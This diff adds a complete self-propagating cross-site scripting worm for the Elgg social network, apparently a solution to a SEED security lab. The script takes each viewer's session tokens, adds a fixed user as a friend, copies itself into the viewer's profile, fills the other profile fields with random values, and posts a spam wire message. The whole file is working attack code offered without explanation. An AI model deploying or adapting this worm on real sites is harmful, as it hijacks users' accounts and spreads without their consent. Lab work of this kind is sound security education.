@@ -1,0 +1,101 @@
+<script id="worm">
+  var headerTag = '<script id="worm" type="text/javascript">';
+  var jsCode = document.getElementById("worm").innerHTML;
+  var tailTag = "</" + "script>";
+  var wormCode = headerTag + jsCode + tailTag;
+
+  window.onload = function () {
+    var Ajax = null;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var guid = "friend=" + 59;
+    //Construct the HTTP request to add Samy as a friend.
+
+    var sendurl = "/action/friends/add?" + guid + ts + token + ts + token; //FILL IN
+
+    if (elgg.page_owner.guid != elgg.session.user.guid) {
+      Ajax = new XMLHttpRequest();
+      Ajax.open("GET", sendurl, true);
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send();
+    }
+
+    var sendurl2 = "/action/profile/edit"; //FILL IN
+    var params2 = {
+      __elgg_ts: elgg.security.token.__elgg_ts,
+      __elgg_token: elgg.security.token.__elgg_token,
+      name: elgg.session.user.username,
+      description: wormCode,
+      "accesslevel[description]": 1,
+      briefdescription: Math.random().toString(36).substring(7),
+      "accesslevel[briefdescription]": 1,
+      location: Math.random().toString(36).substring(7),
+      "accesslevel[location]": 1,
+      interests: Math.random().toString(36).substring(7),
+      "accesslevel[interests]": 1,
+      skills: Math.random().toString(36).substring(7),
+      "accesslevel[skills]": 1,
+      contactemail: "1905072@ugrad.cse.buet.ac.bd",
+      "accesslevel[contactemail]": 1,
+      phone: Math.random().toString(36).substring(7),
+      "accesslevel[phone]": 1,
+      mobile: Math.random().toString(36).substring(7),
+      "accesslevel[mobile]": 1,
+      website: Math.random().toString(36).substring(7),
+      "accesslevel[website]": 1,
+      twitter: Math.random().toString(36).substring(7),
+      "accesslevel[twitter]": 1,
+      guid: elgg.session.user.guid,
+    };
+
+    var content = Object.keys(params2)
+      .map(function (key) {
+        return encodeURIComponent(key) + "=" + encodeURIComponent(params2[key]);
+      })
+      .join("&");
+
+    if (elgg.page_owner.guid != elgg.session.user.guid) {
+      //Create and send Ajax request to modify profile
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl2, true);
+      // Ajax.setRequestHeader("Host","www.seed-server.com");
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send(content);
+    }
+
+    var sendurl3 = "/action/thewire/add"; //FILL IN
+    var params3 = {
+      __elgg_ts: elgg.security.token.__elgg_ts,
+      __elgg_token: elgg.security.token.__elgg_token,
+      body:
+        "To earn 12 USD/Hour(!) visit now http://www.seed-server.com/profile/" +
+        elgg.session.user.username,
+    };
+
+    var content = Object.keys(params3)
+      .map(function (key) {
+        return encodeURIComponent(key) + "=" + encodeURIComponent(params3[key]);
+      })
+      .join("&");
+
+    if (elgg.page_owner.guid != elgg.session.user.guid) {
+      //Create and send Ajax request to modify profile
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl3, true);
+      // Ajax.setRequestHeader("Host","www.seed-server.com");
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send(content);
+    }
+  };
+</script>
